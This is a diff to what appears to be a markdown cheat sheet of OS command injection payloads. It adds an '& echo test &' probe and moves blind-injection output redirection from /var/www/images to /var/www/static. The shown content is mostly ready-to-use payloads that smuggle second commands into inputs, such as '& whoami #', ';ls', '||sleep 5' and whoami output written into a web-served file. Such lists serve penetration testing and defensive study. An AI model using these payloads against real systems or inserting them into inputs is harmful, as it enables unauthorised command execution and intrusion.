@@ -2,6 +2,8 @@
 ___
 ## Simple Case
 ```sh
+& echo test &
+
 & whoami #
 
 ;ls
@@ -27,9 +29,9 @@ asd||sleep 5 # >> Last parameter or to comment out extra parameter
 ## Blind injection with output redirection
 
 ```sql
-& whoami > /var/www/images/output.txt #
+& whoami > /var/www/static/output.txt #
 
-; whoami > /var/www/images/output.txt ;
+; whoami > /var/www/static/output.txt ;
 ```
 
 ## Out of band
